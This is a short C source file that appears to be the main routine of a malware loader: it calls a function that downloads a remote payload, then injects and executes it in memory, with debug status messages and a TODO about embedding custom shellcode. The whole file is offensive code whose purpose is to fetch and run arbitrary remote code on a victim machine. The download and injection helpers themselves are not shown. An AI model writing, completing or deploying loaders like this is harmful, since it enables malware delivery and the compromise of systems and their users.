#include <stdio.h>
#include "core.h"
#include "syscall.h"

#ifdef DEBUG
    #define DEBUG_PRINT(fmt, ...) printf("[*] " fmt "\n", ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...)
#endif

int main() {

    DEBUG_PRINT("[*] Program started.");

    // TODO: set compilation flag to load custom shellcode from shellcode.h

    DEBUG_PRINT("[*] Downloading payload...");
    SIZE_T payload_size = 0;
    char* payload = download_payload(&payload_size);

    if (!payload) {
        DEBUG_PRINT("[-] Failed to download payload.");
        return -1;
    }
    DEBUG_PRINT("[+] Payload downloaded successfully (%zu bytes).", payload_size);

    DEBUG_PRINT("[*] Starting Injection...");
    if (!execute_payload(payload, payload_size)) {
        DEBUG_PRINT("[-] Failed to execute payload.");
        return -1;
    }
    DEBUG_PRINT("[+] Injection complete.");

    return 0;
}